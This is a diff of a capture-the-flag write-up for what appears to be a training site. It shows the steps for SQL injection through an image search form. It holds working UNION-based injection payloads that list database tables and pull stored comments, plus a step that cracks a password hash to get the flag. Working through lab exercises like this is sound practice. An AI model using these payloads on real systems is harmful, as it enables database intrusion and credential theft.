@@ -1,7 +1,12 @@
-Just like in Member field, request table_names :
-1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
+Forms must be protected in order to stop an attacker from introducing malicious
+code or executing database queries. In this case, we have a vulnerable form that
+lets us execute SQL requests and find all the information about whats inside
+the database
 
-Then see that there's a list_images table. Request on it with :
-1 or 1=2 UNION select url, comment from list_images
-
-Then read the line that ask you to decrypt a pass and there we go
+1. Navigate to the search image page
+2. Write the following command in the form and submit to list the table names:
+   - 1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
+3. Write the following command in the form and submit to list the image comments:
+   - 1 or 1=2 UNION select url, comment from list_images
+4. Decrypt the password via : https://md5hashing.net/hash/sha256 and rehash
+   it to get the flag
